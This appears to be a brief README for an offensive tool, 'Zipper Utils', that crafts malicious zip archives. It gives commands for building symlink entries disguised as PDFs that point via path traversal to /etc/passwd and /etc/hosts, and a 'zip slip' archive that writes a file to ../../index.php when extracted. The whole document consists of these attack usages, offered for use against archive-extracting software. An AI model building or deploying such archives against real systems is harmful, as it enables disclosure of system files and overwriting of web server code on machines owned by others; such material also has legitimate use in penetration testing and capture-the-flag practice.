# Zipper Utils

Usage:

```
python zipper.py link output.zip data.pdf '../../../etc/passwd' data2.pdf '../../../../etc/hosts'
# means 
# data.pdf item is link to file ../../../etc/passwd
# data2.pdf item is link to file ../../../../etc/hosts
```

```
python zipper.py slip write_pdf.zip simple.pdf '../../index.php'
# means 
# if unziped this write_pdf.zip 
# create file ../../index.php with content simple.pdf
```

